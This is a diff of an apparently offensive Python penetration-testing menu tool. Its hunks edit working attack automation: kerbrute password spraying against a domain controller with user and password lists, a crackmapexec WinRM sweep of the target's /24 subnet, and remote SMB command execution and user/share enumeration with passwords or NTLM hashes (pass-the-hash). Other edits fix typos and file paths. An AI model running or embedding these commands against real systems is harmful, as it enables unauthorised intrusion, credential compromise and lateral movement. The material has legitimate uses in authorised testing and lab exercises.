@@ -211,7 +211,7 @@ def keys():
    return
    
 def checkInterface(variable):
-   print("[*] Checking network interface...")
+   print("[*] Checking network interface...\n")
    try:      
       authLevel = RPC_C_AUTHN_LEVEL_NONE
       if variable == "DNS":
@@ -224,7 +224,6 @@ def checkInterface(variable):
       portmap.connect()
       objExporter = IObjectExporter(portmap)
       bindings = objExporter.ServerAlive2()
-      print("\n")   
       for binding in bindings:
          NetworkAddr = binding['aNetworkAddr']
          print(colored("Address: " + NetworkAddr, colour6))
@@ -1811,7 +1810,7 @@ while True:
    if selection == '39':
       checkParams = testTwo()      
       exTensions = fileExt.replace(",","|")
-      exTentions = "'(" + exTensions + ")'"            
+      exTensions = "'(" + exTensions + ")'"            
       if IP46 == "-6":
          print(colored("[!] WARNING!!! - Not compatable with IP 6...", colour0)) 
          checkParams = 1       
@@ -1922,30 +1921,33 @@ while True:
       found = 0      
       if checkParams != 1:
          print("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
-         command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile password1.tmp")
+         command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -password " + PAS.rstrip(" ") + " -outputfile password1.tmp")
          test1 = linecache.getline("password1.tmp", 1)
          if test1 != "":
             found = 1
             USR,PAS = testOne.split(":")
             USR = spacePadding(USR, COL1)
             PAS = spacePadding(PAS, COL1)
+            TGT = privCheck(TGT) 
          if found == 0:
             print("\n[*] Now trying all usernames with matching passwords...")
-            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile password2.tmp")         
+            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")         
             test2 = linecache.getline("password2.tmp", 1)
             if test2 != "":
                found = 1
                USR,PAS = test2.split(":")
                USR = spacePadding(USR, COL1)
                PAS = spacePadding(PAS, COL1)
+               TGT = privCheck(TGT)
          if found == 0:
             print("\n[*] Now trying all users against password list, please wait as this could take sometime...")            
-            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords passwords.txt -outputfile password3.tmp > log.tmp")                 
+            command("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp > log.tmp")                 
             test3 = linecache.getline("password3.tmp", 1)
             if test3 != "":
                USR,PAS = test3.split(":") 
                USR = spacePadding(USR, COL1)
                PAS = spacePadding(PAS, COL1)
+               TGT = privCheck(TGT) 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2295,31 +2297,25 @@ while True:
       checkParams = testTwo()
       if checkParams != 1:
          if PAS[:2] != "''":
-            print("[*] Enumerating, please wait...")
-            print("[+] Other exploitable machines on the same subnet...\n")
-            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")         
+            print("[*] Enumerating, please wait...")            
+            print("[+] Finding other exploitable machines on the same subnet...\n")
+            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")                     
             print("\n[+] Trying specified windows command...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x whoami /all")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -x whoami")
             print("\n[+] Trying to enumerate users and shares...\n")  
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --users")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' --shares")         
-            print("\n[+] Trying a few other command while I am here...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x net user Administrator /domain")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x --lusers")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --users")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --shares")
          else:
             print("[i] Using HASH value as password credential")
             print("[*] Enumerating, please wait...")          
-            print("[+] Other exploitable machines on the same subnet...\n")
+            print("[+] Finding other exploitable machines on the same subnet...\n")
             command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")         
             print("\n[+] Trying specified windows command...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -x whoami /all")
+            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -x 'whoami /all'")
             print("\n[+] Trying to enumerate users and shares...\n")  
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users")
             command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares")         
-            print("\n[+] Trying a few other command while I am here...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -x net user Administrator /domain")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -x --lusers")            
-      prompt()
+         prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
